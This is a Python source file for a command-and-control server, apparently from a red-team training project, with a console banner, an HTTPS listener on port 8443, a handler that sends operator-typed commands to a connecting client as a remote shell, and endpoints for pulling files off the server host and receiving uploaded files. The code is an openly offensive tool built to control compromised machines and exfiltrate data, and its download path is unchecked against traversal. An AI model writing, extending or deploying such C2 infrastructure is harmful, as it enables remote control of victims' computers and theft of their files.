import ssl
from http.server import BaseHTTPRequestHandler, HTTPServer
import os
import cgi
import shutil
from termcolor import colored
import pyfiglet


class UI:
    def banner():
        bann = pyfiglet.figlet_format("C2 Server", font="slant")
        print(colored(bann, 'red'))
        print("\r")
        print(colored("-" * 50, 'red'))
        print("\r")
        print(colored('''[SERVER] Use ? (or help) command to show options\n''', 'yellow'))

    def helps():
        print(colored('''
+------------------------+
|  Console Commands:     |~~~~~~~~~~~~~~~~~~~~~~~~:-
+------------------------+''', 'green'))
        print(colored('''
help or ?						:    Shows available Commands 

exit 							:    To exit out from C&C Console environment
		
clear 							:    Clears the console screen

powershell                   	        :    To extablish connection and get a shell
''', 'yellow'))
        print(colored('~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~:-\n', 'green'))


def startPowerShell():
    HOST = 'localhost'
    PORT = 8443
    CERT_FILE = 'E:\Cyber\RootKiteRed101\Project1\certifacte\server.crt'
    KEY_FILE = 'E:\Cyber\RootKiteRed101\Project1\certifacte\server.key'

    server = HTTPSServer(HOST, PORT, CERT_FILE, KEY_FILE)
    server.start()


class MyHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path.startswith('/download/'):
            file_path = self.path[10:]
            self.handle_file_download(file_path)
        else:
            response_data = input("Enter response for client: ")
            response_length = len(response_data)
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.send_header('Content-length', str(response_length))
            self.end_headers()
            self.wfile.write(response_data.encode())

    def do_POST(self):
        content_type = self.headers.get('Content-Type')
        if content_type.startswith('multipart/form-data'):
            form_data = cgi.FieldStorage(fp=self.rfile, headers=self.headers, environ={'REQUEST_METHOD': 'POST'})
            file_field = form_data['file']
            self.handle_file_upload(file_field)
        else:
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length)
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            self.wfile.write(b'Received POST data: ' + post_data)
            print(post_data.decode())

    def handle_file_upload(self, file_field):
        file_data = self.rfile.read(int(self.headers.get('Content-Length')))
        file_path = os.path.join('uploads', file_field.filename)

        with open(file_path, 'wb') as file:
            file.write(file_data)

        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        self.wfile.write(b'File uploaded successfully.')

    def handle_file_download(self, file_path):
        if not os.path.isfile(file_path):
            self.send_response(404)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            self.wfile.write(b'File not found.')
            return

        with open(file_path, 'rb') as file:
            file_data = file.read()

        self.send_response(200)
        self.send_header('Content-type', 'application/octet-stream')
        self.send_header('Content-disposition', 'attachment; filename=' + os.path.basename(file_path))
        self.send_header('Content-length', str(len(file_data)))
        self.end_headers()
        self.wfile.write(file_data)


class HTTPSServer:
    def __init__(self, host, port, cert_file, key_file):
        self.host = host
        self.port = port
        self.cert_file = cert_file
        self.key_file = key_file

    def start(self):
        ssl_context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
        ssl_context.load_cert_chain(certfile=self.cert_file, keyfile=self.key_file)

        server_address = (self.host, self.port)
        httpd = HTTPServer(server_address, MyHandler)
        httpd.socket = ssl_context.wrap_socket(httpd.socket, server_side=True)

        print(f'Starting HTTPS server on {self.host}:{self.port}...')
        try:
            while True:
                httpd.handle_request()
        except KeyboardInterrupt:
            httpd.shutdown()
            print('\nServer stopped.')


def Start():
    UI.banner()
    while True:
        command = input(colored("[SERVER] Enter your command:  ", 'red', attrs=['bold']))
        if command == "exit":
            exit()
        elif (command == "help") or (command == "?"):
            UI.helps()
            continue
        elif command == "clear":
            os.system('cls')


def main() -> None:
    # Start()
    startPowerShell()


if __name__ == '__main__':
    if not os.path.exists('uploads'):
        os.makedirs('uploads')
    main()
